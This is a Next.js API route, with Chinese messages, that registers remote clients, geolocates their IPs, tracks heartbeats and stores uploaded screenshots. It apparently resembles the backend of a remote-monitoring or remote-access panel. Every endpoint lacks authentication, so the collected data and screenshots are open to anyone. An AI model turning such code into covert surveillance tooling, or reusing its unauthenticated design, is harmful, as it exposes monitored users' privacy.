import { NextApiRequest, NextApiResponse } from 'next'

interface ClientInfo {
  id: string
  ip: string
  country: string
  city: string
  isp: string
  hostname: string
  os: string
  username: string
  cpu: string
  ram: string
  lastHeartbeat: number
  status: 'online' | 'offline'
  screenshotUrl?: string
}

const clients = new Map<string, ClientInfo>()
const screenshots = new Map<string, string>()

const getGeolocation = async (ip: string): Promise<{ country: string; city: string; isp: string }> => {
  try {
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.')) {
      return { country: '本地', city: '局域网', isp: '本地网络' }
    }
    
    const response = await fetch(`https://ipapi.co/${ip}/json/`)
    const data = await response.json()
    
    return {
      country: data.country_name || '未知',
      city: data.city || '未知',
      isp: data.org || '未知'
    }
  } catch {
    return { country: '未知', city: '未知', isp: '未知' }
  }
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { action, id } = req.query
  const clientId = id as string

  switch (action) {
    case 'register': {
      const { id: clientId, hostname, os, username, cpu, ram } = req.body
      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
      const geo = await getGeolocation(ip.toString())
      
      const client: ClientInfo = {
        id: clientId,
        ip: ip.toString(),
        ...geo,
        hostname,
        os,
        username,
        cpu,
        ram,
        lastHeartbeat: Date.now(),
        status: 'online'
      }
      
      clients.set(clientId, client)
      res.status(200).json({ status: 'success', message: '客户端注册成功' })
      break
    }

    case 'heartbeat': {
      if (!clientId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const client = clients.get(clientId)
      if (client) {
        client.lastHeartbeat = Date.now()
        client.status = 'online'
        clients.set(clientId, client)
        res.status(200).json({ status: 'success', message: '心跳更新成功' })
      } else {
        res.status(404).json({ status: 'error', message: '客户端不存在' })
      }
      break
    }

    case 'list': {
      const now = Date.now()
      const clientList = Array.from(clients.values()).map(client => {
        const isOnline = now - client.lastHeartbeat < 30000
        return {
          ...client,
          status: isOnline ? 'online' : 'offline' as 'online' | 'offline'
        }
      })
      res.status(200).json({ status: 'success', clients: clientList })
      break
    }

    case 'info': {
      if (!clientId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const client = clients.get(clientId)
      if (client) {
        res.status(200).json({ status: 'success', client })
      } else {
        res.status(404).json({ status: 'error', message: '客户端不存在' })
      }
      break
    }

    case 'screenshot': {
      if (!clientId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const url = screenshots.get(clientId)
      if (url) {
        res.status(200).json({ status: 'success', url })
      } else {
        res.status(404).json({ status: 'error', message: '截图不存在' })
      }
      break
    }

    case 'uploadScreenshot': {
      if (!clientId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      const files = (req as any).files
      if (!files || !files.file) {
        res.status(400).json({ status: 'error', message: '缺少截图文件' })
        break
      }
      
      const file = files.file
      const screenshotData = file.data.toString('base64')
      const dataUrl = `data:image/jpeg;base64,${screenshotData}`
      
      screenshots.set(clientId, dataUrl)
      
      const client = clients.get(clientId)
      if (client) {
        client.screenshotUrl = dataUrl
        clients.set(clientId, client)
      }
      
      res.status(200).json({ status: 'success', message: '截图上传成功' })
      break
    }

    case 'remove': {
      if (!clientId) {
        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
        break
      }
      
      clients.delete(clientId)
      screenshots.delete(clientId)
      res.status(200).json({ status: 'success', message: '客户端已移除' })
      break
    }

    default: {
      res.status(400).json({ status: 'error', message: '未知操作' })
    }
  }
}
